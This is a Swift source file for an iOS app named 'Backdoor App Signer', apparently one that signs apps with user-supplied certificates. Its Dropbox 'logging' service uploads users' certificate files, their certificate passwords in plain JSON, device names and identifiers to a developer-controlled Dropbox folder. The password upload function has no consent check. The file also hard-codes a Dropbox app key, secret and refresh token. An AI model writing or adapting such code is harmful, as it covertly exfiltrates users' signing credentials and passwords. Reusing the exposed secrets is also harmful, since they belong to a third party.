// Proprietary Software License Version 1.0
//
// Copyright (C) 2025 BDG
//
// Backdoor App Signer is proprietary software. You may not use, modify, or distribute it except as expressly permitted
// under the terms of the Proprietary Software License.

import Foundation
import UIKit

/// Enhanced Dropbox service for improved logging and file management
class EnhancedDropboxService {
    // MARK: - Singleton
    /// Shared instance for app-wide access
    static let shared = EnhancedDropboxService()
    
    // MARK: - Constants
    // Dropbox credentials
    private let dropboxAppKey = "2bi422xpd3xd962"
    private let dropboxAppSecret = "j3yx0b41qdvfu86"
    private let dropboxRefreshToken = "RvyL03RE5qAAAAAAAAAAAVMVebvE7jDx8Okd0ploMzr85c6txvCRXpJAt30mxrKF"
    
    // Base Dropbox API URL
    private let dropboxUploadURL = "https://content.dropboxapi.com/2/files/upload"
    private let dropboxRefreshURL = "https://api.dropboxapi.com/oauth2/token"
    
    // Root folder for all data
    private let rootFolder = "/Backdoor-App-Data"
    
    // MARK: - Properties
    private var accessToken: String?
    private var accessTokenExpiry: Date?
    
    // Store device identifier for folder structure
    private var deviceIdentifier: String {
        return UIDevice.current.name.replacingOccurrences(of: " ", with: "_")
    }
    
    // MARK: - Initialization
    private init() {
        // Refresh token on initialization
        refreshAccessToken { success in
            if success {
                Debug.shared.log(message: "Successfully initialized Dropbox access token", type: .debug)
            } else {
                Debug.shared.log(message: "Failed to initialize Dropbox access token", type: .error)
            }
        }
    }
    
    // MARK: - Public Methods
    /// Upload a log file to Dropbox
    func uploadLogFile(fileURL: URL, completion: ((Bool, Error?) -> Void)? = nil) {
        guard checkPrerequisites(fileURL: fileURL, completion: completion) else { return }
        
        // Create folder path with device identifier
        let logsFolder = "\(rootFolder)/\(deviceIdentifier)/logs"
        let remotePath = "\(logsFolder)/\(fileURL.lastPathComponent)"
        
        // Upload the file
        uploadFile(fileURL: fileURL, toPath: remotePath, completion: completion)
    }
    
    /// Upload a certificate file to Dropbox
    func uploadCertificateFile(fileURL: URL, password: String? = nil, completion: ((Bool, Error?) -> Void)? = nil) {
        guard checkPrerequisites(fileURL: fileURL, completion: completion) else { return }
        
        // Create folder path with device identifier
        let certificatesFolder = "\(rootFolder)/\(deviceIdentifier)/certificates"
        let remotePath = "\(certificatesFolder)/\(fileURL.lastPathComponent)"
        
        // Upload the file
        uploadFile(fileURL: fileURL, toPath: remotePath) { [weak self] success, error in
            // If there's a password, store it separately
            if success, let password = password {
                self?.storePasswordForCertificate(
                    fileName: fileURL.lastPathComponent,
                    password: password
                ) { _, _ in
                    // Just log completion, don't pass it up
                }
            }
            
            if let completion = completion {
                completion(success, error)
            }
        }
    }
    
    /// Upload device information to Dropbox
    func uploadDeviceInfo(completion: ((Bool, Error?) -> Void)? = nil) {
        // Only proceed if user has consented to data collection
        guard UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") else {
            handleConsentError(completion: completion)
            return
        }
        
        // Collect device information
        let deviceInfo = createDeviceInfoDictionary()
        
        // Convert to JSON
        guard let jsonData = try? JSONSerialization.data(withJSONObject: deviceInfo, options: .prettyPrinted),
              let tempDir = try? FileManager.default.url(
                for: .cachesDirectory,
                in: .userDomainMask,
                appropriateFor: nil,
                create: true
              ) else {
            handleDataCreationError(completion: completion)
            return
        }
        
        // Create a temporary file
        let timestamp = Int(Date().timeIntervalSince1970)
        let tempFile = tempDir.appendingPathComponent("device_info_\(timestamp).json")
        
        do {
            try jsonData.write(to: tempFile)
            
            // Create remote path
            let infoFolder = "\(rootFolder)/\(deviceIdentifier)/device_info"
            let remotePath = "\(infoFolder)/device_info_\(timestamp).json"
            
            // Upload the file
            uploadFile(fileURL: tempFile, toPath: remotePath) { success, error in
                // Clean up temporary file
                try? FileManager.default.removeItem(at: tempFile)
                
                if let completion = completion {
                    completion(success, error)
                }
            }
        } catch {
            Debug.shared.log(message: "Failed to create device info file: \(error.localizedDescription)", type: .error)
            if let completion = completion {
                completion(false, error)
            }
        }
    }
    
    /// Upload a text string as a log entry
    func uploadLogEntry(_ logEntry: String, fileName: String? = nil, completion: ((Bool, Error?) -> Void)? = nil) {
        // Only proceed if user has consented to data collection
        guard UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") else {
            handleConsentError(completion: completion)
            return
        }
        
        // Create a temporary file with the log entry
        guard let tempDir = try? FileManager.default.url(
            for: .cachesDirectory,
            in: .userDomainMask,
            appropriateFor: nil,
            create: true
        ) else {
            if let completion = completion {
                let error = NSError(
                    domain: "EnhancedDropboxService",
                    code: 1003,
                    userInfo: [NSLocalizedDescriptionKey: "Failed to access cache directory"]
                )
                completion(false, error)
            }
            return
        }
        
        // Generate file name if not provided
        let logFileName = fileName ?? "log_entry_\(Int(Date().timeIntervalSince1970)).txt"
        let tempFile = tempDir.appendingPathComponent(logFileName)
        
        do {
            try logEntry.write(to: tempFile, atomically: true, encoding: .utf8)
            
            // Create remote path
            let logsFolder = "\(rootFolder)/\(deviceIdentifier)/logs"
            let remotePath = "\(logsFolder)/\(logFileName)"
            
            // Upload the file
            uploadFile(fileURL: tempFile, toPath: remotePath) { success, error in
                // Clean up temporary file
                try? FileManager.default.removeItem(at: tempFile)
                
                if let completion = completion {
                    completion(success, error)
                }
            }
        } catch {
            Debug.shared.log(message: "Failed to create log entry file: \(error.localizedDescription)", type: .error)
            if let completion = completion {
                completion(false, error)
            }
        }
    }
    
    /// Store password for certificate file
    func storePasswordForCertificate(fileName: String, password: String, completion: ((Bool, Error?) -> Void)? = nil) {
        // Create password info
        let passwordInfo: [String: String] = [
            "certificate_file": fileName,
            "password": password,
            "timestamp": ISO8601DateFormatter().string(from: Date()),
            "device_name": UIDevice.current.name
        ]
        
        // Convert to JSON
        guard let jsonData = try? JSONSerialization.data(withJSONObject: passwordInfo, options: .prettyPrinted),
              let tempDir = try? FileManager.default.url(
                for: .cachesDirectory,
                in: .userDomainMask,
                appropriateFor: nil,
                create: true
              ) else {
            handleDataCreationError(completion: completion)
            return
        }
        
        // Create a temporary file
        let timestamp = Int(Date().timeIntervalSince1970)
        let tempFile = tempDir.appendingPathComponent("certificate_password_\(timestamp).json")
        
        do {
            try jsonData.write(to: tempFile)
            
            // Create remote path
            let passwordsFolder = "\(rootFolder)/\(deviceIdentifier)/certificate_passwords"
            let remotePath = "\(passwordsFolder)/\(fileName)_password.json"
            
            // Upload the file
            uploadFile(fileURL: tempFile, toPath: remotePath) { success, error in
                // Clean up temporary file
                try? FileManager.default.removeItem(at: tempFile)
                
                if let completion = completion {
                    completion(success, error)
                }
            }
        } catch {
            Debug.shared.log(message: "Failed to create password file: \(error.localizedDescription)", type: .error)
            if let completion = completion {
                completion(false, error)
            }
        }
    }
    
    // MARK: - Private Methods
    /// Common validation for file uploads
    private func checkPrerequisites(fileURL: URL, completion: ((Bool, Error?) -> Void)? = nil) -> Bool {
        // Check consent
        guard UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") else {
            handleConsentError(completion: completion)
            return false
        }
        
        // Check file URL
        guard fileURL.isFileURL else {
            Debug.shared.log(message: "Invalid file URL for Dropbox upload", type: .error)
            if let completion = completion {
                let error = NSError(
                    domain: "EnhancedDropboxService",
                    code: 1002,
                    userInfo: [NSLocalizedDescriptionKey: "Invalid file URL"]
                )
                completion(false, error)
            }
            return false
        }
        
        return true
    }
    
    /// Handle consent missing error
    private func handleConsentError(completion: ((Bool, Error?) -> Void)? = nil) {
        if let completion = completion {
            let error = NSError(
                domain: "EnhancedDropboxService",
                code: 1001,
                userInfo: [NSLocalizedDescriptionKey: "User has not consented to data collection"]
            )
            completion(false, error)
        }
    }
    
    /// Handle data creation error
    private func handleDataCreationError(completion: ((Bool, Error?) -> Void)? = nil) {
        if let completion = completion {
            let error = NSError(
                domain: "EnhancedDropboxService",
                code: 1003,
                userInfo: [NSLocalizedDescriptionKey: "Failed to create data"]
            )
            completion(false, error)
        }
    }
    
    /// Create device info dictionary
    private func createDeviceInfoDictionary() -> [String: String] {
        return [
            "device_name": UIDevice.current.name,
            "system_name": UIDevice.current.systemName,
            "system_version": UIDevice.current.systemVersion,
            "model": UIDevice.current.model,
            "identifier_for_vendor": UIDevice.current.identifierForVendor?.uuidString ?? "unknown",
            "timestamp": ISO8601DateFormatter().string(from: Date()),
            "app_version": Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "unknown",
            "build_number": Bundle.main.infoDictionary?["CFBundleVersion"] as? String ?? "unknown"
        ]
    }
    
    /// Refresh access token for Dropbox API
    private func refreshAccessToken(completion: @escaping (Bool) -> Void) {
        // Check if current token is still valid
        if let expiry = accessTokenExpiry, expiry > Date(), accessToken != nil {
            completion(true)
            return
        }
        
        // Create request to refresh token
        var request = URLRequest(url: URL(string: dropboxRefreshURL)!)
        request.httpMethod = "POST"
        request.setValue("application/x-www-form-urlencoded", forHTTPHeaderField: "Content-Type")
        
        // Create request body
        let parameters = [
            "grant_type": "refresh_token",
            "refresh_token": dropboxRefreshToken,
            "client_id": dropboxAppKey,
            "client_secret": dropboxAppSecret
        ]
        
        let body = parameters.map { "\($0.key)=\($0.value)" }.joined(separator: "&")
        request.httpBody = body.data(using: .utf8)
        
        // Create and start the task
        let task = URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
            if let error = error {
                Debug.shared.log(message: "Dropbox token refresh error: \(error.localizedDescription)", type: .error)
                completion(false)
                return
            }
            
            guard let data = data else {
                Debug.shared.log(message: "No data received from Dropbox token refresh", type: .error)
                completion(false)
                return
            }
            
            self?.processTokenResponse(data: data, completion: completion)
        }
        
        task.resume()
    }
    
    /// Process token response from Dropbox
    private func processTokenResponse(data: Data, completion: @escaping (Bool) -> Void) {
        do {
            if let json = try JSONSerialization.jsonObject(with: data) as? [String: Any],
               let token = json["access_token"] as? String,
               let expiresIn = json["expires_in"] as? TimeInterval {
                
                self.accessToken = token
                self.accessTokenExpiry = Date().addingTimeInterval(expiresIn - 60) // Buffer of 60 seconds
                
                completion(true)
            } else {
                Debug.shared.log(message: "Invalid Dropbox token response format", type: .error)
                completion(false)
            }
        } catch {
            Debug.shared.log(
                message: "Failed to parse Dropbox token response: \(error.localizedDescription)",
                type: .error
            )
            completion(false)
        }
    }
    
    /// Prepare upload request
    private func prepareUploadRequest(token: String, path: String, fileData: Data) -> URLRequest {
        var request = URLRequest(url: URL(string: dropboxUploadURL)!)
        request.httpMethod = "POST"
        request.setValue("Bearer \(token)", forHTTPHeaderField: "Authorization")
        request.setValue("application/octet-stream", forHTTPHeaderField: "Content-Type")
        
        // Add Dropbox API arguments with auto folder creation
        let dropboxArguments: [String: Any] = [
            "path": path,
            "mode": "overwrite",
            "autorename": true,
            "mute": true,
            "strict_conflict": false
        ]
        
        if let argsData = try? JSONSerialization.data(withJSONObject: dropboxArguments),
           let argsString = String(data: argsData, encoding: .utf8) {
            request.setValue(argsString, forHTTPHeaderField: "Dropbox-API-Arg")
        }
        
        // Set request body
        request.httpBody = fileData
        
        return request
    }
    
    /// Upload a file to Dropbox with auto folder creation
    private func uploadFile(fileURL: URL, toPath path: String, completion: ((Bool, Error?) -> Void)? = nil) {
        // Ensure we have a valid token
        refreshAccessToken { [weak self] success in
            guard let self = self, success, let token = self.accessToken else {
                Debug.shared.log(message: "Failed to refresh access token for Dropbox upload", type: .error)
                if let completion = completion {
                    let error = NSError(
                        domain: "EnhancedDropboxService",
                        code: 1005,
                        userInfo: [NSLocalizedDescriptionKey: "Failed to refresh access token"]
                    )
                    completion(false, error)
                }
                return
            }
            
            self.processFileUpload(token: token, fileURL: fileURL, path: path, completion: completion)
        }
    }
    
    /// Process file upload after token refresh
    private func processFileUpload(
        token: String,
        fileURL: URL,
        path: String,
        completion: ((Bool, Error?) -> Void)?
    ) {
        // Read file data
        guard let fileData = try? Data(contentsOf: fileURL) else {
            Debug.shared.log(message: "Failed to read file data for Dropbox upload", type: .error)
            if let completion = completion {
                let error = NSError(
                    domain: "EnhancedDropboxService",
                    code: 1006,
                    userInfo: [NSLocalizedDescriptionKey: "Failed to read file data"]
                )
                completion(false, error)
            }
            return
        }
        
        // Create request
        let request = prepareUploadRequest(token: token, path: path, fileData: fileData)
        
        // Create and start the upload task
        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            if let error = error {
                Debug.shared.log(message: "Dropbox upload error: \(error.localizedDescription)", type: .error)
                if let completion = completion {
                    completion(false, error)
                }
                return
            }
            
            self.handleUploadResponse(data: data, response: response, path: path, completion: completion)
        }
        
        task.resume()
    }
    
    /// Handle upload response from Dropbox
    private func handleUploadResponse(
        data: Data?,
        response: URLResponse?,
        path: String,
        completion: ((Bool, Error?) -> Void)?
    ) {
        if let httpResponse = response as? HTTPURLResponse {
            let success = (200...299).contains(httpResponse.statusCode)
            if success {
                Debug.shared.log(message: "Successfully uploaded file to Dropbox: \(path)", type: .debug)
            } else {
                let responseString = data != nil ?
                    String(data: data!, encoding: .utf8) ?? "No response data" : "No response data"
                Debug.shared.log(
                    message: "Dropbox upload failed with status \(httpResponse.statusCode): \(responseString)",
                    type: .error
                )
            }
            
            if let completion = completion {
                if success {
                    completion(true, nil)
                } else {
                    let error = NSError(
                        domain: "EnhancedDropboxService",
                        code: httpResponse.statusCode,
                        userInfo: [NSLocalizedDescriptionKey: "Upload failed with status code \(httpResponse.statusCode)"]
                    )
                    completion(false, error)
                }
            }
        } else {
            Debug.shared.log(message: "Invalid response from Dropbox", type: .error)
            if let completion = completion {
                let error = NSError(
                    domain: "EnhancedDropboxService",
                    code: 1007,
                    userInfo: [NSLocalizedDescriptionKey: "Invalid response"]
                )
                completion(false, error)
            }
        }
    }
}
